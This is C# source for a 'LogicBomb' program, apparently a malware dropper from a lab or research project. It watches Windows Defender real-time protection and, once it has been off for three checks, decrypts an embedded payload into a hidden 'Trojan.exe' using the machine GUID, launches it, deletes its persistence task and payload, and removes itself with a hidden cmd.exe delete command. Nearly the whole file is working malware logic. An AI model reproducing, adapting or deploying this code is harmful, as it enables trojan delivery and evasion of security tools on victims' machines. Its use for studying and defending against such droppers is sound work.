using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Threading;
using System.Threading.Tasks;
using SharedCrypto;

namespace LogicBomb
{
    internal class Program
    {
        private static readonly string ExecutableBaseDir = AppDomain.CurrentDomain.BaseDirectory;
        private static readonly string ResultDir = Path.Combine(ExecutableBaseDir, "result");

        private const string EncryptedBombName = "bomb.encrypted";
        private const string DecryptedTrojanName = "Trojan.exe";
        private const string LOGICBOMB_TASK_NAME = "MaliciousLogicBomb_Monitor";

        private const int CheckIntervalSeconds = 10;
        private const int ConsecutiveChecksRequired = 3;

        private static string logFile;
        private static CancellationTokenSource cts = new CancellationTokenSource();
        private static int consecutiveDownChecks = 0;
        private static bool lastRealtimeProtectionStatus = true;

        static void Main(string[] args)
        {
            Directory.CreateDirectory(ResultDir);

            // --- MODIFIED: Create timestamped log file name ---
            string timestamp = DateTime.Now.ToString("ddMMyyyy_HHmmss");
            string logFileName = $"LogicBomb_log_{timestamp}.txt";
            logFile = Path.Combine(ResultDir, logFileName);

            Console.WriteLine("[LogicBomb] START (Polymorphic + Defender Monitor) - Press Ctrl+C to stop");
            LogToFile("======================================================");
            LogToFile($"[STARTUP] Process started. PID:{Process.GetCurrentProcess().Id}, User:{Environment.UserName}");
            LogToFile($"[STARTUP] Base Directory: {ExecutableBaseDir}");
            LogToFile($"[STARTUP] Log file created at: {logFile}");
            LogToFile("======================================================");


            Console.CancelKeyPress += (s, e) =>
            {
                Console.WriteLine("[LogicBomb] Stopping...");
                LogToFile("[SHUTDOWN] Ctrl+C detected. Shutting down monitor.");
                e.Cancel = true;
                cts.Cancel();
            };

            LogInfo($"Monitoring Windows Defender Real-Time Protection");
            LogInfo($"Check interval: {CheckIntervalSeconds} seconds");
            LogInfo($"Trigger after {ConsecutiveChecksRequired} consecutive 'disabled' checks");
            Console.WriteLine();

            try
            {
                MonitorDefenderLoop(cts.Token).Wait();
            }
            finally
            {
                cts?.Dispose();
            }

            LogToFile("[SHUTDOWN] Program exiting.");
            Console.WriteLine("[LogicBomb] Exiting.");
        }

        private static async Task MonitorDefenderLoop(CancellationToken token)
        {
            try
            {
                while (!token.IsCancellationRequested)
                {
                    bool realtimeProtectionEnabled = IsRealtimeProtectionEnabled();

                    if (realtimeProtectionEnabled != lastRealtimeProtectionStatus)
                    {
                        if (realtimeProtectionEnabled)
                        {
                            LogSuccess("Windows Defender Real-Time Protection is now ENABLED");
                            consecutiveDownChecks = 0;
                        }
                        else
                        {
                            LogWarning("Windows Defender Real-Time Protection is now DISABLED");
                        }
                        lastRealtimeProtectionStatus = realtimeProtectionEnabled;
                    }

                    if (!realtimeProtectionEnabled)
                    {
                        consecutiveDownChecks++;
                        LogInfo($"Real-Time Protection disabled - Check {consecutiveDownChecks}/{ConsecutiveChecksRequired}");

                        if (consecutiveDownChecks >= ConsecutiveChecksRequired)
                        {
                            LogWarning($"Real-Time Protection has been disabled for {ConsecutiveChecksRequired} consecutive checks. TRIGGERING PAYLOAD!");
                            LogToFile($"[TRIGGER] Trigger activated: RTP was disabled for {ConsecutiveChecksRequired} consecutive checks.");

                            TriggerPayload();
                            break; // Exit the monitoring loop
                        }
                    }
                    else
                    {
                        if (consecutiveDownChecks > 0)
                        {
                            // Reset counter if RTP is re-enabled
                            consecutiveDownChecks = 0;
                        }
                    }

                    await Task.Delay(CheckIntervalSeconds * 1000, token);
                }
            }
            catch (TaskCanceledException)
            {
                LogInfo("Monitoring cancelled.");
            }
            catch (Exception ex)
            {
                LogError($"Monitor loop error: {ex.Message}");
            }
        }

        private static bool IsRealtimeProtectionEnabled()
        {
            try
            {
                using (var searcher = new ManagementObjectSearcher(@"root\Microsoft\Windows\Defender", "SELECT * FROM MSFT_MpComputerStatus"))
                {
                    foreach (ManagementObject queryObj in searcher.Get())
                    {
                        var rtpEnabled = queryObj["RealTimeProtectionEnabled"];
                        if (rtpEnabled != null)
                        {
                            return Convert.ToBoolean(rtpEnabled);
                        }
                    }
                }
            }
            catch (ManagementException mex)
            {
                LogWarning($"WMI query failed, falling back to registry. Error: {mex.Message}");
                try
                {
                    using (var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows Defender\Real-Time Protection"))
                    {
                        if (key != null)
                        {
                            object disableValue = key.GetValue("DisableRealtimeMonitoring");
                            if (disableValue != null)
                            {
                                // Returns true if the 'disable' value is 0
                                return Convert.ToInt32(disableValue) == 0;
                            }
                        }
                    }
                }
                catch (Exception regEx)
                {
                    LogWarning($"Registry check failed: {regEx.Message}");
                }
            }
            catch (Exception ex)
            {
                LogError($"Failed to check Real-Time Protection: {ex.Message}");
            }

            LogWarning("Could not determine RTP status, assuming enabled as a safeguard.");
            return true; // Default to true to prevent accidental triggers
        }

        private static void TriggerPayload()
        {
            try
            {
                LogInfo("=== PAYLOAD TRIGGERED ===");
                LogToFile("[PAYLOAD] Payload activation sequence started.");

                // --- MODIFIED: Log trigger event to file instead of creating a marker file ---
                LogToFile($"[PAYLOAD] Trigger reason: Windows Defender Real-Time Protection was disabled at {DateTime.Now:yyyy-MM-dd HH:mm:ss}");

                string machineGuid = CryptoUtils.GetMachineGuid();
                LogInfo($"Local Machine GUID: {machineGuid}");

                string encryptedBombPath = Path.Combine(ExecutableBaseDir, EncryptedBombName);
                string executableToRun = null;

                if (File.Exists(encryptedBombPath))
                {
                    try
                    {
                        LogInfo($"Found encrypted payload: {encryptedBombPath}");
                        string decryptedTrojanPath = Path.Combine(ResultDir, DecryptedTrojanName);
                        CryptoUtils.DecryptFile(encryptedBombPath, decryptedTrojanPath, machineGuid);

                        LogSuccess($"Decrypted payload to: {decryptedTrojanPath}");
                        LogToFile($"[PAYLOAD] Decrypted '{encryptedBombPath}' to '{decryptedTrojanPath}'.");

                        if (File.Exists(decryptedTrojanPath))
                        {
                            try
                            {
                                File.SetAttributes(decryptedTrojanPath, FileAttributes.Hidden | FileAttributes.System);
                                LogSuccess($"Set attributes for {DecryptedTrojanName} to Hidden+System");
                            }
                            catch (Exception ex)
                            {
                                LogWarning($"Failed to set attributes on Trojan.exe: {ex.Message}");
                            }

                            executableToRun = decryptedTrojanPath;
                            LogInfo($"Trojan.exe is ready for execution");
                        }
                        else
                        {
                            LogError($"Trojan.exe not found after decryption attempt.");
                        }
                    }
                    catch (System.Security.Cryptography.CryptographicException ex)
                    {
                        LogError("Decryption failed. The Machine GUID may be incorrect or the file is corrupt.");
                        LogToFile($"[ERROR] Decryption failed: {ex.Message}");
                    }
                    catch (Exception ex)
                    {
                        LogError($"Error processing encrypted payload: {ex.Message}");
                    }
                }
                else
                {
                    LogError($"{EncryptedBombName} not found in program directory.");
                }

                if (executableToRun != null)
                {
                    LogInfo($"Launching: {executableToRun}");
                    LogToFile($"[PAYLOAD] About to launch payload: {executableToRun}");

                    var psi = new ProcessStartInfo
                    {
                        FileName = executableToRun,
                        WorkingDirectory = ResultDir,
                        UseShellExecute = true,
                        CreateNoWindow = false
                    };

                    try
                    {
                        Process.Start(psi);
                        LogSuccess("Trojan.exe started successfully.");
                        LogToFile($"[PAYLOAD] Launched executable: {executableToRun}");

                        CleanupAndExit();
                    }
                    catch (Exception ex)
                    {
                        LogError($"Error launching executable: {ex.Message}");
                    }
                }
                else
                {
                    LogError("Payload trigger failed - no executable to run.");
                }
            }
            catch (Exception ex)
            {
                LogError($"A critical error occurred in TriggerPayload: {ex.Message}");
            }
        }

        private static void CleanupAndExit()
        {
            try
            {
                LogInfo("Starting self-destruct sequence...");
                LogToFile("[CLEANUP] Self-destruct sequence initiated.");

                DeleteScheduledTask(LOGICBOMB_TASK_NAME);

                string bombPath = Path.Combine(ExecutableBaseDir, EncryptedBombName);
                if (File.Exists(bombPath))
                {
                    File.Delete(bombPath);
                    LogInfo("Deleted bomb.encrypted");
                    LogToFile($"[CLEANUP] Deleted encrypted payload: {bombPath}");
                }

                string selfPath = Process.GetCurrentProcess().MainModule.FileName;

                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = $"/C timeout /T 2 /NOBREAK > nul & del /F /Q \"{selfPath}\"",
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    WindowStyle = ProcessWindowStyle.Hidden
                };

                Process.Start(psi);
                LogInfo("Self-deletion scheduled.");
                LogToFile($"[CLEANUP] Self-deletion scheduled for '{selfPath}' in 2 seconds.");
            }
            catch (Exception ex)
            {
                LogError($"Cleanup error: {ex.Message}");
            }

            LogInfo("Exiting now. The trojan is running.");
            Environment.Exit(0);
        }

        private static void DeleteScheduledTask(string taskName)
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = "schtasks.exe",
                    Arguments = $"/Delete /TN \"{taskName}\" /F",
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };

                using (Process process = Process.Start(psi))
                {
                    string error = process.StandardError.ReadToEnd();
                    process.WaitForExit();

                    if (process.ExitCode == 0)
                    {
                        LogSuccess($"Deleted scheduled task: {taskName}");
                    }
                    else
                    {
                        // This might not be an error if the task never existed, so log as info
                        LogInfo($"Could not delete scheduled task '{taskName}'. It may not exist. Details: {error}");
                        LogToFile($"[CLEANUP] Note: Failed to delete scheduled task '{taskName}': {error}");
                    }
                }
            }
            catch (Exception ex)
            {
                LogError($"Error deleting scheduled task: {ex.Message}");
            }
        }

        // --- NEW: Central method for writing to the log file ---
        private static void LogToFile(string message)
        {
            try
            {
                string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
                string logEntry = $"[{timestamp}] {message}";

                int retries = 3;
                while (retries > 0)
                {
                    try
                    {
                        File.AppendAllText(logFile, logEntry + Environment.NewLine);
                        return; // Exit method on success
                    }
                    catch (IOException) when (retries > 1)
                    {
                        retries--;
                        Thread.Sleep(50); // Wait briefly if file is locked
                    }
                }
            }
            catch (Exception ex)
            {
                // If logging fails, write to console as a last resort
                Console.WriteLine($"[CRITICAL LOGGING FAILURE]: {ex.Message}");
            }
        }

        // --- MODIFIED: Console logging methods now also write to the log file ---
        private static void LogInfo(string message)
        {
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.Write("[INFO] ");
            Console.ResetColor();
            Console.WriteLine(message);
            LogToFile($"[INFO] {message}");
        }

        private static void LogSuccess(string message)
        {
            Console.ForegroundColor = ConsoleColor.Green;
            Console.Write("[SUCCESS] ");
            Console.ResetColor();
            Console.WriteLine(message);
            LogToFile($"[SUCCESS] {message}");
        }

        private static void LogWarning(string message)
        {
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.Write("[WARNING] ");
            Console.ResetColor();
            Console.WriteLine(message);
            LogToFile($"[WARNING] {message}");
        }

        private static void LogError(string message)
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("[ERROR] ");
            Console.ResetColor();
            Console.WriteLine(message);
            LogToFile($"[ERROR] {message}");
        }
    }
}